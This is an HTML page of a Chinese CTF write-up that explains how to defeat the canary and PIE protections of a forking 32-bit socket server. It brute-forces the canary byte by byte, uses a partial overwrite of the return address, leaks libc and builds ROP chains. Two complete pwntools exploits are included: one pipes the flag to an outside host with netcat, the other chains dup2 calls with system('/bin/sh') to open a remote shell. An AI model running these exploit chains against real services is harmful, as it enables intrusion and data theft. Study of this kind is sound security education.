@@ -1,0 +1,1506 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>bypass pie use partial overwrite and dup2 - Junay的博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="前言&amp;emsp;&amp;emsp;这篇文章记录如何使用partial overwrite绕过pie和使用dup2重定向输入输出流到socket。">
+<meta name="keywords" content="hexo,javascript">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypass pie use partial overwrite and dup2">
+<meta property="og:url" content="http://yoursite.com/2018/11/pie-bypass-overwrite-dup2/index.html">
+<meta property="og:site_name" content="Junay的博客">
+<meta property="og:description" content="前言&amp;emsp;&amp;emsp;这篇文章记录如何使用partial overwrite绕过pie和使用dup2重定向输入输出流到socket。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/13.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/14.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/15.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/16.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/17.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/18.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/19.png">
+<meta property="og:updated_time" content="2018-11-23T14:07:02.431Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bypass pie use partial overwrite and dup2">
+<meta name="twitter:description" content="前言&amp;emsp;&amp;emsp;这篇文章记录如何使用partial overwrite绕过pie和使用dup2重定向输入输出流到socket。">
+<meta name="twitter:image" content="http://yoursite.com/images/posts/pwn/13.png">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="bypass pie use partial overwrite and dup2" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    17 分钟 读完 (大约 2556 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                bypass pie use partial overwrite and dup2
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这篇文章记录如何使用<code>partial overwrite</code>绕过<code>pie</code>和使用<code>dup2</code>重定向输入输出流到<code>socket</code>。<br><a id="more"></a></p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>&emsp;&emsp;简单描述下题目的环境，首先服务端使用<code>fork</code>进程来为每个用户建立<code>socket</code>来进行通信，主要逻辑如下：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/13.png"><br></div>
+
+<p>&emsp;&emsp;其中在<code>read_msg</code>使用socket的<code>recv</code>接收用户输入，同时漏洞也产生在这。</p>
+<p>&emsp;&emsp;由于是<code>fork</code>，所以fork得到进程有<code>父进程</code>一样的存储数据，如果开启了<code>canary</code>，那么每次socket连接得到的进程的<code>canary cookie</code>都是跟父进程一样的，这也是我们爆破的<code>前提</code>。</p>
+<p>&emsp;&emsp;接下来<code>checksec</code>binary，查看程序开启的保护，得到：</p>
+<ul>
+<li>Arch:     i386-32-little</li>
+<li>RELRO:    Partial RELRO</li>
+<li>Stack:    Canary found</li>
+<li>NX:       NX enabled</li>
+<li>PIE:      PIE enabled</li>
+</ul>
+<p>&emsp;&emsp;如上，程序把基本的保护都开了。</p>
+<p>&emsp;&emsp;在简单的栈溢出中，我们的直接目的就是覆盖函数的返回地址从而达到控制程序执行流的目的，而canary防护就是在返回地址的<code>前面</code>，加上一串随机的字符，每次程序<code>ret</code>时，对这串字符进行检查，如果这个值跟系统记录的值有所差异，系统就会终止程序执行，达到保护的作用。用gdb调试时可以发现：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/14.png"><br></div>
+
+<p>&emsp;&emsp;如图，1是canary cookie的位置，而2是要覆盖的返回地址的位置。从图中可以知道要覆盖到2，必然会先覆盖1，所以，如果我们无法得到1的值，那么就算覆盖了2位置，程序在返回时检查<code>cookie</code>也会失败，然后停止执行，最终exp失败。</p>
+<p>&emsp;&emsp;前面说过，fork出来的进程内存数据是跟父进程一样的，那么对于<code>canary</code>我们可以通过<code>爆破</code>的方式找到，并且由于cookie（通常为0xXXXXXX00）的<code>最低一个字节</code>为<code>0</code>，我们其实只要爆破3个字节就行。</p>
+<p>&emsp;&emsp;然后再解释一下<code>ASLR</code>跟<code>PIE</code>的关系与区别：</p>
+<h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>&emsp;&emsp;ASLR有三级，分别为:</p>
+<ul>
+<li>0: 关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同</li>
+<li>1: 普通的ASLR。mmap基地址、栈（stack）基地址、.so加载基地址都将被随机化，但是堆没用随机化</li>
+<li>2: 增强的ASLR，增加了堆随机化</li>
+</ul>
+<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>&emsp;&emsp;而PIE是对<code>代码段、数据段</code>进行地址随机化，但是最终决定是否随机化的靠看<code>ASLR</code>，如果ASLR是关闭的，那么就算开启了PIE<code>也不会</code>进行地址随机化。</p>
+<p>&emsp;&emsp;开启了PIE后，在IDA里看到的就是<code>偏移地址</code>，真实地址需要<code>code base address + offset</code>得到。</p>
+<div align="center"><br>    <img src="/images/posts/pwn/15.png"><br></div>
+
+<p>&emsp;&emsp;对于<code>pie</code>的绕过目前有<code>partial overwrite</code>的方法，因为<code>code base address</code>的<code>低12bit</code>都是<code>0</code>，如图：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/16.png"><br></div>
+
+<p>&emsp;&emsp;所以我们可以通过控制<code>最低一个字节</code>来控制程序的执行流，然后找到可以作为参考的点，进行<code>爆破</code>判断，原理上类似于爆破canary cookie。</p>
+<div align="center"><br>    <img src="/images/posts/pwn/17.png"><br></div><br>&emsp;&emsp;在这道题中，在原来本该返回的地址下方有一个给用户(客户端)<code>send</code>消息的函数，那么我们就可以利用这个地址作为我们爆破的点。我们以服务端是否有<code>消息发送</code>过来作为爆破成功的依据。<br><br>&emsp;&emsp;我们知道<code>send_client</code>函数（0x00001177）的最低一个字节是<code>\x77</code>，因为代码段基地址在上面中我们可以看到是<code>0x56561000</code>，所以不管怎么加，它的真实地址的<code>最低一个字节</code>都是<code>\x77</code>。当我们猜中它的地址时它就会发送一些奇怪的东西，因为它调用时栈还是乱七八槽的，但确实能得到数据，如我这里得到的<code>\xb0\x1d\x1b</code>，那我每次都以这个为准。<br><br>&emsp;&emsp;最终exp可以写成：<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># ip = '192.168.210.11'</span></span><br><span class="line">ip = <span class="hljs-string">'127.0.0.1'</span></span><br><span class="line"><span class="hljs-comment"># 'a' * 64 + p32(canary) + 'a' * 12 + p32(ret_addr)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    canary = <span class="hljs-string">"\x00"</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> j == <span class="hljs-number">10</span>:</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">            <span class="hljs-keyword">print</span> p.recvline()</span><br><span class="line">            temp = canary + chr(j)</span><br><span class="line">            payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">4</span> * <span class="hljs-number">4</span> + temp</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">'See you again!\n'</span>)</span><br><span class="line">                canary = temp</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">            <span class="hljs-keyword">except</span>:</span><br><span class="line">                <span class="hljs-keyword">pass</span></span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"[***] found canary : "</span> + canary</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># fuzz()</span></span><br><span class="line"></span><br><span class="line">canary = <span class="hljs-number">0x1b617500</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz_send_client</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    code_base = <span class="hljs-string">"\x77"</span></span><br><span class="line">    ok = <span class="hljs-keyword">False</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> j == <span class="hljs-number">10</span>:</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">            <span class="hljs-keyword">print</span> p.recvline()</span><br><span class="line">            temp = code_base + chr(j)</span><br><span class="line">            payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + temp</span><br><span class="line">            <span class="hljs-keyword">if</span> j == <span class="hljs-number">145</span>:</span><br><span class="line">                pause()</span><br><span class="line">                p.sendline(payload)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">print</span> p.recvuntil(<span class="hljs-string">'\xb0\x1d\x1b'</span>)</span><br><span class="line">                code_base = temp</span><br><span class="line">                ok = <span class="hljs-keyword">True</span></span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">            <span class="hljs-keyword">except</span>:</span><br><span class="line">                <span class="hljs-keyword">pass</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok:</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">"[!!!] Oops!!!"</span></span><br><span class="line">            exit(<span class="hljs-number">-1</span>)</span><br><span class="line">    code_base = hex(u32(code_base) - <span class="hljs-number">0x1177</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"[***] found code_base : "</span> + code_base</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># fuzz_send_client()</span></span><br><span class="line"></span><br><span class="line">code_base = <span class="hljs-number">0x5655e000</span></span><br><span class="line"></span><br><span class="line">pelf = ELF(<span class="hljs-string">'./pie'</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">'./libc.so.local'</span>)</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">main_addr = code_base + <span class="hljs-number">0x00000F3C</span></span><br><span class="line">send_addr = code_base + <span class="hljs-number">0x00000E8C</span></span><br><span class="line">libc_start_main = code_base + pelf.got[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(send_addr) + p32(main_addr) + p32(<span class="hljs-number">4</span>) + p32(libc_start_main) + p32(<span class="hljs-number">16</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u32(p.recv()[:<span class="hljs-number">4</span>])</span><br><span class="line">p.close()</span><br><span class="line">log.debug(<span class="hljs-string">"libc_start_main: "</span> + hex(libc_start_main))</span><br><span class="line"></span><br><span class="line">libc_base_addr = libc_start_main - libc.symbols[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"libc_base_addr: "</span> + hex(libc_base_addr))</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="hljs-string">"system"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"system_addr: "</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">bss_addr = code_base + <span class="hljs-number">0x00003084</span></span><br><span class="line">recv_addr = code_base + <span class="hljs-number">0x00000DDA</span></span><br><span class="line">shellcode = <span class="hljs-string">"cat flag | nc ip 9999"</span></span><br><span class="line"></span><br><span class="line">log.debug(<span class="hljs-string">"ready to write bss..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(recv_addr) + p32(system_addr) + p32(<span class="hljs-number">4</span>) + p32(bss_addr) + p32(len(shellcode)) + p32(<span class="hljs-number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">log.debug(<span class="hljs-string">"ready to write shelloce..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># log.debug("call system...")</span></span><br><span class="line"><span class="hljs-comment"># pause()</span></span><br><span class="line"><span class="hljs-comment"># p = remote(ip, 10007)</span></span><br><span class="line"><span class="hljs-comment"># p.recvline()</span></span><br><span class="line"><span class="hljs-comment"># payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(system_addr) + p32(system_addr) + p32(bss_addr)</span></span><br><span class="line"><span class="hljs-comment"># p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 0xf75c9c94:	call   0xf763f7e0 &lt;execve&gt; </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;<code>fuzz</code>和<code>fuzz_send_client</code>分别爆破canary cookie和程序基地址，其实他们都一种手法。<br><br>&emsp;&emsp;这里还需要特别说明的是exp在：<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(recv_addr) + p32(system_addr) + p32(<span class="hljs-number">4</span>) + p32(bss_addr) + p32(len(shellcode)) + p32(<span class="hljs-number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">log.debug(<span class="hljs-string">"ready to write shelloce..."</span>)</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;就已经攻击成功，一开始我还有些疑惑，可以看到那些注释了的代码才是我原本的思路，我还需要return到system调用shellcode。<br><br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(system_addr) + p32(system_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;但是事实上，在<code>recv_addr</code>执行完跳到<code>system_addr</code>的时候栈内的数据刚好满足<code>system</code>调用shellcode。而且按照原来的思路：先把shellcode写到<code>bss段</code>，然后再起一个连接执行<code>system(bss_shellcode)</code>。但在调试过程中发现，<code>bss段</code>在每个连接中都会被清<code>0</code>，并不能保存上一个进程写入的<code>shellcode</code>。<br><br>&emsp;&emsp;在<code>p.sendline(shellcode)</code>执行后的程序栈如下：<br><div align="center"><br>    <img src="/images/posts/pwn/18.png"><br></div>
+
+<p>&emsp;&emsp;我单独对<code>system</code>调用写了一个简单的程序，对他调试到<code>system</code>处的情况：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/19.png"><br></div>
+
+<p>&emsp;&emsp;可以看到在进入<code>system</code>时的栈情况都相同，栈顶为返回地址，接下去是参数。</p>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>&emsp;&emsp;上面之所以采用反弹的方式是因为<code>socket</code>不能作为程序的输入输出流，因为主程序运行在服务器上，所以即使你<code>/bin/sh</code>成功，你也收不到shell，只会在服务器端开启一个shell。如果我们能够重定向输入输出流到socket，那么我们就能拿到一个<code>shell</code>。</p>
+<p>&emsp;&emsp;在Linux中有一个<code>dup2</code>的程序，其官方解释如下：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dup, dup2, dup3 - duplicate a file descriptor</span><br><span class="line"></span><br><span class="line">The dup() system call creates a copy of the file descriptor oldfd,</span><br><span class="line">using the lowest-numbered unused file descriptor for the new</span><br><span class="line">descriptor.</span><br><span class="line"></span><br><span class="line">The dup2() system call performs the same task as dup(), but instead</span><br><span class="line">of using the lowest-numbered unused file descriptor, it uses the file</span><br><span class="line">descriptor number specified in newfd.  If the file descriptor newfd</span><br><span class="line">was previously open, it is silently closed before being reused.</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;它的作用就是<code>重定向</code>一个文件描述符，Linux的理念就是一切皆文件，输入输出也一样。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: 进程的标准输入相关联</span><br><span class="line">1: 进程的标准输出相关联</span><br><span class="line">2: 进程的标准错误输出相关联</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;而socket的文件描述符在此环境中为<code>4</code>。那么我们就可以使用：</p>
+<ul>
+<li>dup2(4, 0)</li>
+<li>dup2(4, 1)</li>
+</ul>
+<p>&emsp;&emsp;来把输入输出定向到socket上。</p>
+<p>&emsp;&emsp;因为dup2只对当前进程有效，不能说我先用两个连接(进程)来启动dup2，之后就直接调system。我们必须在一次连接中完成重定向输入输出和调用system。那么我们怎么构造payload呢？一般我们都是return一次，如：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行完recv，就跳到system，但不能再跳了</span><br><span class="line">payload = &apos;a&apos; * 64 + p32(canary) + &apos;b&apos; * 12 + p32(recv_addr) + p32(system_addr) + p32(4) + p32(bss_addr) + p32(len(shellcode)) + p32(0)</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这里我们使用一个<code>gadget</code>：<code>pop pop ret</code>。因为我们dup2的参数有两个，所以我们要pop两次才能维持<code>栈平衡</code>，不影响下一个调用。这里的gadget可以用<code>ROPgadget</code>查找。</p>
+<p>&emsp;&emsp;最终的exp如下：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># ip = '192.168.210.11'</span></span><br><span class="line">ip = <span class="hljs-string">'127.0.0.1'</span></span><br><span class="line"></span><br><span class="line">canary = <span class="hljs-number">0x1b617500</span></span><br><span class="line">code_base = <span class="hljs-number">0x5655e000</span></span><br><span class="line"></span><br><span class="line">pelf = ELF(<span class="hljs-string">'./pie'</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">'./libc.so.local'</span>)</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">main_addr = code_base + <span class="hljs-number">0x00000F3C</span></span><br><span class="line">send_addr = code_base + <span class="hljs-number">0x00000E8C</span></span><br><span class="line">libc_start_main = code_base + pelf.got[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span> + p32(send_addr) + p32(main_addr) + p32(<span class="hljs-number">4</span>) + p32(libc_start_main) + p32(<span class="hljs-number">16</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u32(p.recv()[:<span class="hljs-number">4</span>])</span><br><span class="line">p.close()</span><br><span class="line">log.debug(<span class="hljs-string">"libc_start_main: "</span> + hex(libc_start_main))</span><br><span class="line"></span><br><span class="line">libc_base_addr = libc_start_main - libc.symbols[<span class="hljs-string">"__libc_start_main"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"libc_base_addr: "</span> + hex(libc_base_addr))</span><br><span class="line">system_addr = libc_base_addr + libc.symbols[<span class="hljs-string">"system"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"system_addr: "</span> + hex(system_addr))</span><br><span class="line">binsh_addr = libc_base_addr + next(libc.search(<span class="hljs-string">'/bin/sh'</span>))</span><br><span class="line">log.debug(<span class="hljs-string">"binsh_addr: "</span> + hex(binsh_addr))</span><br><span class="line">dup2_adddr = libc_base_addr + libc.symbols[<span class="hljs-string">"dup2"</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"dup2_adddr: "</span> + hex(dup2_adddr))</span><br><span class="line"></span><br><span class="line">ppr_addr = code_base + <span class="hljs-number">0x0000122A</span></span><br><span class="line">log.debug(<span class="hljs-string">"use dup2 to call system sh..."</span>)</span><br><span class="line">pause()</span><br><span class="line">p = remote(ip, <span class="hljs-number">10007</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">padding = <span class="hljs-string">'a'</span> * <span class="hljs-number">64</span> + p32(canary) + <span class="hljs-string">'b'</span> * <span class="hljs-number">12</span></span><br><span class="line">payload = padding + p32(dup2_adddr) + p32(ppr_addr) + p32(<span class="hljs-number">4</span>) + p32(<span class="hljs-number">1</span>) + p32(dup2_adddr) + p32(ppr_addr) + p32(<span class="hljs-number">4</span>) + p32(<span class="hljs-number">0</span>)</span><br><span class="line">payload += p32(system_addr) + p32(<span class="hljs-number">0</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a href="https://blog.csdn.net/silent123go/article/details/71108501" target="_blank" rel="noopener">https://blog.csdn.net/silent123go/article/details/71108501</a></li>
